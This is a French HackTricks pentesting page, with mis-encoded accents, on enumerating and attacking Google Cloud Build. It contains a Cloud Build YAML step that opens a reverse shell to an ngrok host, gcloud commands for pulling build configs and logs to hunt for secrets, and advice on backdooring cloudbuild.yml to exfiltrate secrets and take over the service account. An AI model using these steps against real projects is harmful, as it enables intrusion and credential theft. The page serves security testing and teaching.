# GCP - Enum√©ration de Cloud Build

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Google Cloud Build est une plateforme de CI/CD g√©r√©e qui **automatise la construction de logiciels** et les processus de publication, s'int√©grant aux **d√©p√¥ts de code source** et prenant en charge un large √©ventail de langages de programmation. Il **permet aux d√©veloppeurs de construire, tester et d√©ployer du code automatiquement** tout en offrant la possibilit√© de personnaliser les √©tapes de construction et les flux de travail.

Chaque d√©clencheur Cloud Build est **li√© √† un r√©f√©rentiel Cloud ou directement connect√© √† un r√©f√©rentiel externe** (Github, Bitbucket ou Gitlab).

Il est possible de configurer un Cloud Build pour **exiger des approbations pour les ex√©cutions de construction** (d√©sactiv√© par d√©faut).

Le **compte de service a la port√©e `cloud-platform`**, il peut donc **utiliser tous les privil√®ges**. Si **aucun compte de service n'est sp√©cifi√©** (comme lors de la soumission), le **compte de service par d√©faut** `<num√©ro-projet>@cloudbuild.gserviceaccount.com` sera **utilis√©**.

{% hint style="success" %}
Je n'ai trouv√© aucun moyen de voler le jeton Github/Bitbucket √† partir d'ici ou des r√©f√©rentiels Cloud car lorsque le r√©f√©rentiel est t√©l√©charg√©, il est acc√©d√© via une URL [https://source.cloud.google.com/](https://source.cloud.google.com/) et Github n'est pas accessible par le client.
{% endhint %}

### Stockage

Parfois, Cloud Build **g√©n√©rera un nouveau stockage pour stocker les fichiers du d√©clencheur**. Cela se produit par exemple dans l'exemple que GCP propose avec :
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket de stockage appel√© [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) est cr√©√© pour stocker un fichier `.tgz` contenant les fichiers √† utiliser.

### Obtenir un shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### √ânum√©ration

Vous pourriez trouver des **informations sensibles dans les configurations de construction et les journaux**.
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## √âl√©vation de privil√®ges

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acc√®s non authentifi√©

### cloudbuild.yml

Si vous obtenez un acc√®s en √©criture sur un r√©f√©rentiel contenant un fichier nomm√© **`cloudbuild.yml`**, vous pouvez **introduire une porte d√©rob√©e** dans ce fichier, qui sp√©cifie les **commandes qui vont √™tre ex√©cut√©es** √† l'int√©rieur d'un Cloud Build et exfiltrer les secrets, compromettre ce qui est fait et compromettre √©galement le **compte de service Cloud Build**.

{% hint style="info" %}
Notez que GCP offre la possibilit√© aux administrateurs de contr√¥ler l'ex√©cution des syst√®mes de construction √† partir de PR externes via "Comment Control". Comment Control est une fonctionnalit√© o√π les collaborateurs/propri√©taires de projet **doivent commenter "/gcbrun" pour d√©clencher la construction** par rapport √† la PR et l'utilisation de cette fonctionnalit√© emp√™che intrins√®quement toute personne sur Internet de d√©clencher vos syst√®mes de construction.
{% endhint %}

Pour plus d'informations connexes, vous pouvez consulter la page sur la fa√ßon d'attaquer les actions Github (similaire √† cela) :

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
